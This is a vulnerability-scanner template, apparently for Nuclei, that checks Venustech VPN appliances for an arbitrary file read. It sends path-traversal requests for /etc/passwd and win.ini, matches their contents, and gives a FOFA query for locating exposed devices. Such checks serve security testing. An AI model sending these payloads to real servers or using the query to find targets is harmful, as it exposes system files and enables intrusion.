
id: venustech-vpn-download-cilent-fileread

info:
  name: 启明星辰天清汉马 VPN 系统 download/cilent - fileread
  author: leadlife
  severity: high
  description: 启明星辰天清汉马VPN系统download接口处存在任意文件读取漏洞，获取服务器的敏感数据和配置信息，造成系统的不安全性，从而控制服务器。
  reference:
    - todo
  metadata:
    verified: true
    fofa-query: icon_hash="-15980305" || app="网御星云-VPN" || (body="select_auth_method" && body="select_auth_input") || app="启明星辰-天清汉马VPN"
  tags: venustech, vpn, fileread

http:
  - method: GET
    path:
      - "{{BaseURL}}/vpn/user/download/client?ostype=../../../../../../../etc/passwd"
      - "{{BaseURL}}/index.php?file=./../../../../../../c:/windows/win.ini"

    stop-at-first-match: true
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "\\[(font|extension|file)s\\]"
        condition: or